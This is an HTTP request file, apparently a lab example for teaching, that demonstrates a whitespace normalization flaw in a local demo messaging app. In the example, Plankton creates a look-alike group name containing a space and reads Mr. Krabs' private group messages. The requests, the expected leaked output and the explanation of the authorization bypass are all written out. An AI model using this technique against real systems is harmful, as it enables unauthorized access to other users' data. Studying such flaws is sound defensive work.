@base = http://localhost:8000/ii/normalization-canonicalization/example3

# Normally:
#   Spongebob can see Mr. Krabs messages as he is a member of the group.
#   Plankton is unable to access these messages directly (because he is not the member of this group)
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic spongebob@krusty-krab.sea:bikinibottom
# Results in the sensitive data disclosure:
#
# [
#   {
#     "from": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   }
# ]

###

# Attack:
#   Plankton creates a new group with the same name as his victim's group (staff@krusty-krab.sea) but with a whitespace present in the middle.
POST {{base}}/groups
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/json

{
    "name": "staff @krusty-krab.sea",
    "users": [{"role": "admin", "user": "plankton@chum-bucket.sea"}],
    "messages": []
}

###

# Plankton accesses his group with the whitespace in the path
GET {{base}}/groups/staff @krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
# Results in sensitive data disclosure:
#
# [
#   {
#     "from_user": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   }
# ]
#
# IMPACT: Plankton has stolen the safe password using a whitespace-based shadow
# group attack! The authorization check validates against "staff @krusty-krab.sea"
# (with space) where Plankton is admin, but the message retrieval strips
# whitespace and queries "staff@krusty-krab.sea" (Mr. Krabs' real group).
# This whitespace normalization inconsistency is particularly subtle because
# the space character in URLs is often hard to notice, and developers might
# assume whitespace trimming is consistent across all operations. The attack
# demonstrates that ANY normalization difference between authorization and
# data access creates an exploitable binding drift.
